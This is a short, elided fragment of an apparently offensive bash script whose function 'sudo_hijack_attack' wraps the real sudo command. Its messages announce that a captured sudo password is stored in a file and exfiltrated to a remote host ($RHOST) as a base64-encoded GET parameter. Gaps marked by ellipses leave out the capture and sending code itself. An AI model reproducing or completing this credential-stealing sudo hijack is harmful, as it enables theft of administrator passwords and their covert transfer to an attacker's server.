...
sudo_hijack_attack () {
	...
	$realsudo "${@:1}"
			...
			echo -e "\e[92m[+]\e[0m Password will be Stored in $PASSWDFILE"
			echo -e "\e[92m[+]\e[0m $PASSWDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
		else
